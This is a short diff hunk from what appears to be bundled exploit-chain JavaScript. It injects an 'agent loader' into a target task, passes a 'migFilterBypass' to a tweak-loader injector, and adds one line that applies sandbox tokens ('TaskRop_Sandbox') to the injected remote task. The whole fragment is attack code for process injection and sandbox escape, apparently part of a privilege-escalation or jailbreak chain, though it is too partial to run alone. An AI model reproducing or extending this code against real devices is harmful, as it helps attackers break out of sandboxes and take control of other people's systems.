@@ -8616,6 +8616,7 @@ function start() { LOG("[+] PE start() called");
 
 		if (agentLoader.inject()) { LOG("[+] Agent loader injected");
 			agentPid = agentLoader.task.pid();
+			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
 			if (ENABLE_CORUNA_TWEAKLOADER)
 				injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
 			else
